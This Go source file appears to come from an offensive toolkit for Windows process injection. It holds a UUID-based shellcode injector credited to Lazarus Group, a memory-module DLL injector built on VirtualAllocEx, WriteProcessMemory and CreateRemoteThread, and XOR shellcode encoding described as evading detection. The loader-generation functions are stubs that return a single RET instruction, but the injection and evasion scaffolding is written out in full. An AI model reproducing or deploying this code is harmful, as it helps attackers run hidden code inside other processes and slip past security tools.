package injection

import (
	"encoding/hex"
	"fmt"
	"strings"
)

// UUIDInjector implements the UUID injection technique used by Lazarus Group
type UUIDInjector struct {
	BaseInjector
}

// NewUUIDInjector creates a new UUID injector
func NewUUIDInjector() *UUIDInjector {
	return &UUIDInjector{
		BaseInjector: BaseInjector{
			name:        "UUIDInjection",
			description: "Process injection using UUIDs to store and execute shellcode (used by Lazarus Group)",
		},
	}
}

// Inject injects shellcode using UUID injection technique
func (i *UUIDInjector) Inject(pid int, shellcode []byte) error {
	// Validate shellcode
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Convert shellcode to UUIDs
	uuids, err := shellcodeToUUIDs(shellcode)
	if err != nil {
		return fmt.Errorf("failed to convert shellcode to UUIDs: %v", err)
	}

	// Allocate memory for the UUID array
	uuidArraySize := SIZE_T(len(uuids) * 16) // Each UUID is 16 bytes
	uuidArrayAddr, err := VirtualAllocEx(hProcess, 0, uuidArraySize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory for UUID array: %v", err)
	}

	// Write UUIDs to the allocated memory
	for i, uuid := range uuids {
		err = WriteProcessMemory(hProcess, LPVOID(uintptr(uuidArrayAddr)+uintptr(i*16)), uuid, 16)
		if err != nil {
			virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
			return fmt.Errorf("failed to write UUID: %v", err)
		}
	}

	// Allocate memory for the loader code
	loaderCode := generateUUIDLoaderCode(uuidArrayAddr, DWORD(len(uuids)))
	loaderCodeAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(loaderCode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to allocate memory for loader code: %v", err)
	}

	// Write loader code to the allocated memory
	err = WriteProcessMemory(hProcess, loaderCodeAddr, loaderCode, SIZE_T(len(loaderCode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write loader code: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, loaderCodeAddr, SIZE_T(len(loaderCode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Create a remote thread to execute the loader code
	hThread, err := CreateRemoteThread(hProcess, 0, 0, loaderCodeAddr, 0, 0)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(uuidArrayAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	// Wait for the thread to complete
	WaitForSingleObject(hThread, INFINITE)

	// Get the thread exit code
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

// shellcodeToUUIDs converts shellcode to UUIDs
func shellcodeToUUIDs(shellcode []byte) ([][]byte, error) {
	// Pad shellcode to multiple of 16 bytes (UUID size)
	paddedSize := (len(shellcode) + 15) & ^15
	paddedShellcode := make([]byte, paddedSize)
	copy(paddedShellcode, shellcode)

	// Convert to UUIDs
	var uuids [][]byte
	for i := 0; i < len(paddedShellcode); i += 16 {
		uuid := make([]byte, 16)
		copy(uuid, paddedShellcode[i:i+16])
		uuids = append(uuids, uuid)
	}

	return uuids, nil
}

// generateUUIDLoaderCode generates shellcode to load and execute UUIDs
func generateUUIDLoaderCode(uuidArrayAddr LPVOID, uuidCount DWORD) []byte {
	// This is a simplified implementation
	// In a real implementation, you would generate x86/x64 assembly code
	// that reconstructs the shellcode from UUIDs and executes it

	// For now, we'll return a dummy shellcode that just returns
	return []byte{0xC3} // RET instruction
}

// MemoryModuleInjector implements the memory module injection technique
type MemoryModuleInjector struct {
	BaseInjector
}

// NewMemoryModuleInjector creates a new memory module injector
func NewMemoryModuleInjector() *MemoryModuleInjector {
	return &MemoryModuleInjector{
		BaseInjector: BaseInjector{
			name:        "MemoryModule",
			description: "Process injection by loading a DLL directly from memory",
		},
	}
}

// Inject injects a DLL from memory
func (i *MemoryModuleInjector) Inject(pid int, dllBytes []byte) error {
	// Validate DLL
	if len(dllBytes) == 0 {
		return fmt.Errorf("DLL data is empty")
	}

	// Check if it's a valid PE file
	if !isPEFile(dllBytes) {
		return fmt.Errorf("not a valid PE file")
	}

	// Check if process is running
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	// Open the target process
	hProcess, err := OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	// Allocate memory for the DLL
	dllAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(dllBytes)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory for DLL: %v", err)
	}

	// Write DLL to the allocated memory
	err = WriteProcessMemory(hProcess, dllAddr, dllBytes, SIZE_T(len(dllBytes)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write DLL: %v", err)
	}

	// Allocate memory for the loader code
	loaderCode := generateMemoryModuleLoaderCode(dllAddr)
	loaderCodeAddr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(loaderCode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to allocate memory for loader code: %v", err)
	}

	// Write loader code to the allocated memory
	err = WriteProcessMemory(hProcess, loaderCodeAddr, loaderCode, SIZE_T(len(loaderCode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to write loader code: %v", err)
	}

	// Change memory protection to allow execution
	_, err = VirtualProtectEx(hProcess, loaderCodeAddr, SIZE_T(len(loaderCode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Create a remote thread to execute the loader code
	hThread, err := CreateRemoteThread(hProcess, 0, 0, loaderCodeAddr, dllAddr, 0)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(dllAddr), 0, MEM_RELEASE)
		virtualFreeEx.Call(uintptr(hProcess), uintptr(loaderCodeAddr), 0, MEM_RELEASE)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer CloseHandle(hThread)

	// Wait for the thread to complete
	WaitForSingleObject(hThread, INFINITE)

	// Get the thread exit code
	exitCode, err := GetExitCodeThread(hThread)
	if err != nil {
		return fmt.Errorf("failed to get thread exit code: %v", err)
	}

	if exitCode != 0 {
		return fmt.Errorf("thread exited with code %d", exitCode)
	}

	return nil
}

// isPEFile checks if data is a valid PE file
func isPEFile(data []byte) bool {
	// Check for MZ header
	if len(data) < 2 || data[0] != 'M' || data[1] != 'Z' {
		return false
	}
	return true
}

// generateMemoryModuleLoaderCode generates shellcode to load a DLL from memory
func generateMemoryModuleLoaderCode(dllAddr LPVOID) []byte {
	// This is a simplified implementation
	// In a real implementation, you would generate x86/x64 assembly code
	// that loads the DLL from memory using memory module technique

	// For now, we'll return a dummy shellcode that just returns
	return []byte{0xC3} // RET instruction
}

// ShellcodeUtils provides utility functions for shellcode manipulation
type ShellcodeUtils struct{}

// NewShellcodeUtils creates a new shellcode utilities instance
func NewShellcodeUtils() *ShellcodeUtils {
	return &ShellcodeUtils{}
}

// HexToShellcode converts a hex string to shellcode bytes
func (s *ShellcodeUtils) HexToShellcode(hexStr string) ([]byte, error) {
	// Remove any whitespace and "0x" prefixes
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\t", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	hexStr = strings.ReplaceAll(hexStr, "0x", "")
	hexStr = strings.ReplaceAll(hexStr, "\\x", "")

	// Decode hex string to bytes
	shellcode, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, fmt.Errorf("failed to decode hex string: %v", err)
	}

	return shellcode, nil
}

// EncodeShellcode encodes shellcode to evade detection
func (s *ShellcodeUtils) EncodeShellcode(shellcode []byte, key byte) []byte {
	encoded := make([]byte, len(shellcode))
	for i, b := range shellcode {
		encoded[i] = b ^ key
	}
	return encoded
}

// DecodeShellcode decodes previously encoded shellcode
func (s *ShellcodeUtils) DecodeShellcode(encoded []byte, key byte) []byte {
	// XOR is symmetric, so we can use the same function
	return s.EncodeShellcode(encoded, key)
}

// GenerateShellcodeLoader generates a shellcode loader
func (s *ShellcodeUtils) GenerateShellcodeLoader(shellcode []byte, technique string) ([]byte, error) {
	// This is a simplified implementation
	// In a real implementation, you would generate a complete loader based on the technique

	switch technique {
	case "createthread":
		return []byte{0x90, 0x90, 0x90, 0xC3}, nil // NOP, NOP, NOP, RET
	case "apc":
		return []byte{0x90, 0x90, 0x90, 0xC3}, nil // NOP, NOP, NOP, RET
	default:
		return nil, fmt.Errorf("unsupported technique: %s", technique)
	}
}
